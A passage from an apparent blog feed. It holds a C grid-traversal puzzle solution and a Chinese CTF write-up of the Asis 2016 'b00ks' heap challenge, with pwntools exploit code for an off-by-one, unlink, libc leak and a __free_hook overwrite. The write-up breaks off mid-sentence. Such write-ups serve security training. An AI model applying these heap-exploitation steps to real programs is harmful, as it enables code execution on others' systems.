<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">        visited[i][j]=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> DFS(<span class="number">0</span>,<span class="number">0</span>,m,n,visited,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        total+=num%<span class="number">10</span>;</span><br><span class="line">        num/=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j, <span class="keyword">int</span> m, <span class="keyword">int</span> n, <span class="keyword">bool</span>** visited, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span> || i&gt;=m || j&lt;<span class="number">0</span> || j&gt;=n || cal(i)+cal(j)&gt;k || visited[i][j]==<span class="literal">true</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    visited[i][j]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> DFS(i<span class="number">-1</span>,j,m,n,visited,k)+DFS(i,j<span class="number">-1</span>,m,n,visited,k)+DFS(i+<span class="number">1</span>,j,m,n,visited,k)+DFS(i,j+<span class="number">1</span>,m,n,visited,k)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;地上有一个m行n列的方格，从坐标 [0,0] 到坐标 [m-1,n-1] 。一个机器人从坐标 [0, 0] 的格子开始移动，它每次可以向左、右、上、下移动一格（不能移动到方格外），也不能进入行坐标和列坐标的数位之和大于k的格子。例如，当k为18时，机器人能够进入方格 [35, 37] ，因为3+5+3+7=18。但它不能进入方格 [35, 38]，因为3+5+3+8=19。请问该机器人能够到达多少个格子？&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>Asis 2016 b00ks</title>
    <link href="http://yoursite.com/2020/02/27/Asis-2016-b00ks/"/>
    <id>http://yoursite.com/2020/02/27/Asis-2016-b00ks/</id>
    <published>2020-02-26T16:28:58.000Z</published>
    <updated>2020-02-26T16:29:53.003Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>许久没有练习pwn题了，今天拿一道堆题练练手，漏洞点在Null byte off-by-one以及unlink。</p><p>题目来源(包括exp)：Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks" target="_blank" rel="noopener">b00ks</a></p><a id="more"></a><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p>64位小端序程序，除了canary保护全开。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先打印出欢迎字段并要求输入用户名</span></span><br><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name:</span><br><span class="line"></span><br><span class="line"><span class="comment">#之后打印出常见的菜单程序，包括创建、删除、编辑、打印、改变用户名，注意有打印就可能存在方便泄露的地方</span></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#可见需要我们输入书名，可自定义大小，但最大32字符</span></span><br><span class="line"><span class="comment">#允许输入描述信息大小，好像没限制大小，在汇编看看</span></span><br><span class="line">Enter book name size: 10</span><br><span class="line">Enter book name (Max 32 chars): aaaa</span><br><span class="line"></span><br><span class="line">Enter book description size: 10</span><br><span class="line">Enter book description: aaa</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//发现并没有限制描述大小</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//book结构体，存放在bss段的数组中</span></span><br><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)v3 + <span class="number">6</span>) = v1;<span class="comment">//描述信息大小，注意此处DWORD+6=QWORD+3，2*6=3*4</span></span><br><span class="line">  *((_QWORD *)off_202010 + v2) = v3;<span class="comment">//bss上数组保存当前malloc地址，即存储book结构体数组</span></span><br><span class="line">  *((_QWORD *)v3 + <span class="number">2</span>) = v5;<span class="comment">//描述信息，malloc的地址</span></span><br><span class="line">  *((_QWORD *)v3 + <span class="number">1</span>) = ptr;<span class="comment">//书名，malloc的地址</span></span><br><span class="line">  *(_DWORD *)v3 = ++unk_202024;<span class="comment">//序号</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//值得注意的是它所有的内容输入都通过一个自定义函数实现，末尾边界处存在溢出</span></span><br><span class="line"><span class="comment">//看出for循环下标从0开始，而当输入为换行或者下标等于a2时退出，此处a2为输入大小-1，但是由于从0开始导致下标为31时已经输入了32个字符，且最后一个*buf = 0导致溢出了一个null字符。</span></span><br><span class="line"><span class="comment">//注意输入Auther时a2为32，说明此时可以输入33个</span></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">Enter the book id you want to delete: 1</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//free后都置null了，暂时没有UAF等利用</span></span><br><span class="line"><span class="keyword">if</span> ( i != <span class="number">20</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + <span class="number">8L</span>L));<span class="comment">//书名</span></span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + <span class="number">16L</span>L));<span class="comment">//描述信息</span></span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)off_202010 + i));<span class="comment">//释放当前块</span></span><br><span class="line">  *((_QWORD *)off_202010 + i) = <span class="number">0L</span>L;<span class="comment">//置0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编辑可以用来修改描述信息</span></span><br><span class="line">3</span><br><span class="line">Enter the book id you want to edit: 1</span><br><span class="line">Enter new book description: bbb</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter new book description: "</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_9F5(</span><br><span class="line">                      *(_BYTE **)(*((_QWORD *)off_202010 + i) + <span class="number">16L</span>L),</span><br><span class="line">                      *(_DWORD *)(*((_QWORD *)off_202010 + i) + <span class="number">24L</span>L) - <span class="number">1</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><h4 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 4</span><br><span class="line">ID: 1</span><br><span class="line">Name: aa</span><br><span class="line">Description: aa</span><br><span class="line">Author: aaa</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接打印，且只判断ID不为0则打印</span></span><br><span class="line"><span class="comment">//注意printf打印时根据\x00来判断是否截断</span></span><br><span class="line">v0 = *((_QWORD *)off_202010 + i);</span><br><span class="line"><span class="keyword">if</span> ( v0 )<span class="comment">//ID不为0则打印</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"ID: %d\n"</span>, **((<span class="keyword">unsigned</span> <span class="keyword">int</span> **)off_202010 + i));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, *(_QWORD *)(*((_QWORD *)off_202010 + i) + <span class="number">8L</span>L));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, *(_QWORD *)(*((_QWORD *)off_202010 + i) + <span class="number">16L</span>L));</span><br><span class="line">  LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">"Author: %s\n"</span>, off_202018);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>首先需要说明，由于程序开启了PIE导致代码段和堆段地址随机，只有低三个字节是不变的，并且调试过程中多次重启程序改断点调试，因此地址变化很大，请以实际调试为主。</p><p>首先可以看到申请一个book会创建3个chunk，由低到高分别是name(0x5583b53ef020)、description(0x5583b53ef050)、book结构体(0x5583b53ef080)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x5583b53ef010</span><br><span class="line">0x5583b53ef010:0x00000000000000000x0000000000000031</span><br><span class="line">0x5583b53ef020:0x00317463656a626f0x0000000000000000</span><br><span class="line">0x5583b53ef030:0x00000000000000000x0000000000000000</span><br><span class="line">0x5583b53ef040:0x00000000000000000x0000000000000031</span><br><span class="line">0x5583b53ef050:0x00317463656a626f0x0000000000000000</span><br><span class="line">0x5583b53ef060:0x00000000000000000x0000000000000000</span><br><span class="line">0x5583b53ef070:0x00000000000000000x0000000000000031</span><br><span class="line">0x5583b53ef080:0x00000000000000010x00005583b53ef020</span><br><span class="line">0x5583b53ef090:0x00005583b53ef0500x0000000000000020</span><br><span class="line">0x5583b53ef0a0:0x00000000000000000x0000000000020f61</span><br></pre></td></tr></table></figure><p>然后由于Auther和book结构体数组保存在bss上，且Auther输入也是使用自定义的输入函数，并且这两个部分是相邻的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此处直接搜索Auther的内容即可找到</span></span><br><span class="line">pwndbg&gt; search <span class="string">'aaaa'</span></span><br><span class="line">b00ks           0x562085e59040 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59044 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59048 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e5904c 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59050 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59054 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59058 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e5905c 0x8759a08061616161</span><br><span class="line"></span><br><span class="line"><span class="comment">#可见Auther和book结构体数组相邻，原因在于输入的32个a末尾还有一个0放在60处，但是后来创建book后覆盖掉了</span></span><br><span class="line"><span class="comment">#因此可以直接打印Auther就可以打印出堆地址</span></span><br><span class="line">pwndbg&gt; x/20gx 0x562085e59040</span><br><span class="line">0x562085e59040:0x61616161616161610x6161616161616161</span><br><span class="line">0x562085e59050:0x61616161616161610x6161616161616161</span><br><span class="line">0x562085e59060:0x000056208759a0800x0000000000000000</span><br></pre></td></tr></table></figure><p>好了，现在已经可以拿到堆地址了。关注到change功能可以修改Auther的名字，那么我们可以使用change修改Auther将第一个book结构体的地址的最低位覆盖为第一个book的description部分，因为这里输入不受限制方便伪造一个book结构体。</p><p>到此我们可以控制一个book结构体，他的内容包括id、书名的malloc地址、description的malloc地址，因此再下次edit时可以手动往我们指定的伪造的book中的description地址中写数据，从而达到任意地址写。</p><p>好了，到这里我们已经拥有了任意地址写的能力，但是还有一个问题：如何泄露libc基地址？我们任意地址写的话一般写got表也好，写malloc_hook或者free_hook也好，都因为ASLR需要计算libc基地址来进行偏移地址的计算。因此我们需要在堆上找到libc偏移，首先需要直到堆的基址，通过top chunk以及泄露的第一个chunk可以算出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#top chunk地址</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555c627ef000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 4113, </span><br><span class="line">  fd = 0xa3233, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算堆的起始偏移为0x1080，用第一个book的首地址与top chunk首地址之差来计算</span></span><br><span class="line">pwndbg&gt; distance 0x0000555c627f0080 0x555c627ef000</span><br><span class="line">0x555c627f0080-&gt;0x555c627ef000 is -0x1080 bytes (-0x210 words)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#前半部分实现泄露堆地址</span></span><br><span class="line">createname(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">0x20</span>,<span class="string">'a'</span>,<span class="number">0x20</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'4'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Author:'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = u64(book1_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = book1_addr - <span class="number">0x1080</span></span><br></pre></td></tr></table></figure><p>接着需要申请两个chunk再释放掉，为了让其进入fastbin后出来是反过来的，即再申请的时候先分配原3号块的地址(高位地址分配给4号chunk)，然后再分配原来的低位地址给5号chunk，从而unlink 5号块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 1'</span>, <span class="number">0x20</span>, <span class="string">'desc buf'</span>) <span class="comment"># 2</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 2'</span>, <span class="number">0x20</span>, <span class="string">'desc buf 2'</span>) <span class="comment"># 3</span></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>下面在编号为4的describe中构建一个chunk，该chunk需要伪造出ptr指针指向该chunk从而过unlink保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这里写chunk4的description，一直写到chunk5的</span></span><br><span class="line">ptr = heap_base + 0x1180</span><br><span class="line">payload = p64(0)</span><br><span class="line">payload += p64(0x101)</span><br><span class="line">payload += p64(ptr - 0x18)</span><br><span class="line">payload += p64(ptr - 0x10)</span><br><span class="line">payload += '\x00' * 0xe0</span><br><span class="line">payload += p64(0x100)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">本次调试book4结构体地址，通过搜索Auther填写的字符串来定位book结构体数组</span></span><br><span class="line">0x000056448bac5170</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">定位book4具体结构，其中0x000056448bac51d0是要写入chunk的地址</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x000056448bac5170</span></span><br><span class="line">0x56448bac5170:0x00005644000000040x000056448bac51a0</span><br><span class="line">0x56448bac5180:0x000056448bac51d00x0000000000000108</span><br><span class="line">0x56448bac5190:0x00000000000000000x0000000000000031</span><br><span class="line">    </span><br><span class="line"><span class="meta">#</span><span class="bash">具体chunk填充内容，其中fd和bk地址分别是ptr-0x18和ptr-0x10，因此ptr为了过保护必须指向0x000056448bac51d0，所以ptr为地址0x56448bac5180的值</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x000056448bac51d0</span></span><br><span class="line">0x56448bac51d0:0x00000000000000000x0000000000000101</span><br><span class="line">0x56448bac51e0:0x000056448bac51680x000056448bac5170</span><br><span class="line">0x56448bac51f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x56448bac5200:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>注意4、5、6三个块的申请如下，6号块为了放置unlink 4和5时合并到top chunk中去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment"># 4</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">'target'</span>) <span class="comment"># 5</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read write'</span>) <span class="comment"># 6</span></span><br></pre></td></tr></table></figure><p>在unlink时，下图为第五块的description，他被释放时会根据size字段最后一位判断前一个块是否空闲，通过pre_size字段找到前一个块，因此这里两个都空闲会触发unlink操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk5-&gt;description</span></span><br><span class="line">pwndbg&gt; x/20xg 0x0000564f5602c2e0-0x10</span><br><span class="line">0x564f5602c2d0:0x00000000000001000x0000000000000100</span><br><span class="line">0x564f5602c2e0:0x00007465677261740x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk4-&gt;description，已被事先伪造好</span></span><br><span class="line">pwndbg&gt; x/20xg 0x0000564f5602c2e0-0x10-0x100</span><br><span class="line">0x564f5602c1d0:0x00000000000000000x0000000000000101</span><br><span class="line">0x564f5602c1e0:0x0000564f5602c1680x0000564f5602c170</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink后ptr地址的值会变为ptr-0x18，即地址180的值会变为168</span></span><br><span class="line"><span class="comment">#可以看到chunk4的description地址被改为168</span></span><br><span class="line">pwndbg&gt; x/20gx 0x0000564d8444f180-0x10</span><br><span class="line">0x564d8444f170:0x0000564d000000040x0000564d8444f1a0</span><br><span class="line">0x564d8444f180:0x0000564d8444f1680x0000000000000108</span><br></pre></td></tr></table></figure><p>经过unlink后地址168的值便是chunk4的description的地址，那么我们修改它就是修改description的值，将该chunk的descrip改为chunk6的description。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x11a0</span>)<span class="comment">#chunk4 name的固定偏移</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x10c0</span>)<span class="comment">#chunk6 description地址的固定偏移</span></span><br><span class="line">payload += <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">editbook(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这个时候就可以向chunk4写description，然后通过写chunk6来修改chunb4的description的内容</span></span><br></pre></td></tr></table></figure><p>记得上面unlink时是一个samll bin大小的块，因此会被放入unsorted bin中暂存，并且由于有chunk6的存在不会和top chunk合并，因此它的fd和bk会泄露libc地址，该libc地址一般为main_arena+88的地址，因此可以算出main_arena的地址，并且由于main_arena在libc的偏移不变(定义于malloc_trim函数中，使用ida搜函数可以查看到常量)，此处偏移为0x3c4b78，即可算出libc基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将地址送到chunk4中的description起始是chunk6的description地址位置，然后读出来</span></span><br><span class="line"><span class="comment">#此处将main_arena+88的地址写入，然后将该地址读出来算出libc基址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_at</span><span class="params">(addr)</span>:</span></span><br><span class="line">    editbook(<span class="number">4</span>, p64(addr))</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()[:<span class="number">-1</span>]</span><br><span class="line">    io.info(content)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="comment">#算出libc基址，heap_base + 0x11e0是unlink后的块</span></span><br><span class="line">libc_leak = u64(read_at(heap_base + <span class="number">0x11e0</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure><p>拿到libc基址后就可以随便玩了，这里向free_hook写system，最后删除chunk6即可，删除时会free name、description和book结构体，在free 